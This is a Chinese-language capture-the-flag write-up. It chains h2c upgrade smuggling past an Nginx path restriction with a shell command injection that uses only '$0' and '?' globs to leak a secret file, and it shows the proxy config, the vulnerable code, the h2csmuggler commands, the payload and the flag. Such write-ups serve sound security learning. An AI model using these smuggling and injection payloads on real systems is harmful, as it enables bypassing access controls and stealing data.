# Plotwist

## 题目简述

应用由 Nginx 反向代理和支持 HTTP/2 的 Hypercorn/FastAPI 后端组成。Nginx 禁止直接访问 `/api/noopsy`，却在公开的 `/api/lordhttp` 上原样转发 h2c 升级头。先利用 h2c 升级越过 Nginx 的路径级访问控制，再绕过仅允许数字、空格、`?` 和 `$` 的命令过滤，即可让 shell 读取秘密文件。

## 解题过程

### 比较两个路由

直接请求受限接口会被 Nginx 拒绝：

```bash
curl -i 'http://target/api/noopsy'
```

返回 HTTP 403。Nginx 配置中的差异是：

```nginx
location /api/lordhttp {
    proxy_pass http://localhost:8000/api/lordhttp;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection $http_connection;
}

location /api/noopsy {
    deny all;
}
```

公开路由把客户端的 `Upgrade: h2c`、`Connection: Upgrade, HTTP2-Settings` 和 `HTTP2-Settings` 转给支持 h2c 的 Hypercorn。升级成功后，这条上游连接成为持久 HTTP/2 连接；后续流不再作为新的 HTTP/1.1 请求经过 Nginx 的路径匹配，因此可以直接发给后端的 `/api/noopsy`。

### h2c 升级走私

使用 `h2csmuggler.py`，以 `/api/lordhttp` 作为允许升级的代理入口，以 `/api/noopsy` 作为升级后请求的目标：

```bash
python3 h2csmuggler.py \
  -x 'http://target/api/lordhttp' \
  'http://target/api/noopsy'
```

第二个 HTTP/2 流返回 200，并给出关键提示：秘密保存在 `secret_flag.txt`。

接着通过同一通道向受限接口提交 POST：

```bash
python3 h2csmuggler.py \
  -x 'http://target/api/lordhttp' \
  'http://target/api/noopsy' \
  -X POST \
  --data '{"letter":"100$"}'
```

响应中出现 `/bin/sh: 1: 100$: not found`，说明 `letter` 被交给 shell 执行。源码对应：

```python
regex = r"^[0-9 ?$]+$"

match = re.fullmatch(regex, content)
command = match.group()
result = subprocess.run(
    command,
    shell=True,
    capture_output=True,
    text=True,
)
```

### 只用白名单字符读取文件

不能直接提交 `cat secret_flag.txt`，因为字母和下划线均不在白名单内。可以利用两种 shell 展开：

- `$0` 在 `/bin/sh -c '<命令>'` 中展开为当前 shell 的名称；
- `?` 是恰好匹配一个字符的通配符。

`secret_flag.txt` 一共 15 个字符，所以 15 个问号会在当前工作目录中匹配该文件：

```text
$0 ???????????????
```

展开后的效果相当于：

```bash
/bin/sh secret_flag.txt
```

秘密文件并不是合法 shell 脚本，它的第一行 flag 会被当作命令执行。shell 的错误信息会原样进入 API 的 `stderr` 响应，从而反向泄露该行：

```bash
python3 h2csmuggler.py \
  -x 'http://target/api/lordhttp' \
  'http://target/api/noopsy' \
  -X POST \
  --data '{"letter":"$0 ???????????????"}'
```

响应包含：

```text
secret_flag.txt: 1: N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}: not found
```

因此 flag 为：

```text
N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}
```

## 方法总结

本题需要串联两层协议语义。第一层是错误转发 h2c 升级头，使升级后的 HTTP/2 流绕过 Nginx 的路径 ACL；第二层是 `shell=True` 带来的命令注入，即使字符白名单很窄，`$0` 和 glob 仍足以把目标文件交给 shell 解释。尤其要准确理解最终 payload：`$0` 展开的是 shell 名称，问号通配符才负责定位 `secret_flag.txt`，flag 则由脚本解析错误回显。
